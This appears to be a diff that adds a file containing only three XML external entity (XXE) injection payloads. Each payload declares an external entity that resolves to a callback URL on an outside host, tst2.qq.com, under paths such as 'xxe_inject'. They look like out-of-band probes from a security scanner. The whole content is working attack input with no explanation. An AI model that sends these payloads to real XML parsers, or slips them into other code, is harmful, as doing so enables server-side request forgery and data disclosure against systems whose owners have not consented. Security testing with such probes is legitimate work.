@@ -1,0 +1,22 @@
+
+
+
+
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://tst2.qq.com/T_S_T/2296f6ddf52b4ed683b4fc3da5af3162">
+%xxe;  
+]>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://tst2.qq.com/xxe_inject/269841ec6ede1314f983fc5ebf8f94ff">
+%xxe;  
+]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+	<!ENTITY xxe SYSTEM "http://tst2.qq.com/xxe_inject/60e5171cc612cc393c3df89129ab2f59">]>
+<foo><value>&xxe;</value></foo>
+
